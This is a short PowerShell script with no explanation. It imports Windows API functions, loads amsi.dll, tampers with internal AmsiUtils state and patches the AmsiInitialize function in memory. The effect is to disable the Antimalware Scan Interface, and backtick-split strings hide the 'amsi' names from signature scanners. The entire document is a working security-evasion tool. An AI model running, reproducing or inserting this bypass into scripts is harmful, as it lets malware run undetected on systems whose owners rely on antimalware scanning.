$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am`si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Am`si`In`itialize")
$p = 0
[ref].Assembly.GetType("System.Management.Automation.Am`siUtils").GetField("Am`siUninitializeCalled", "Public,Static").SetValue($null, $false)
[ref].Assembly.GetType("System.Management.Automation.Am`siUtils").GetDeclaredMethod("Un`initialize").Invoke($null, $null)
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xC2, 0x80, 0x00)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 3)
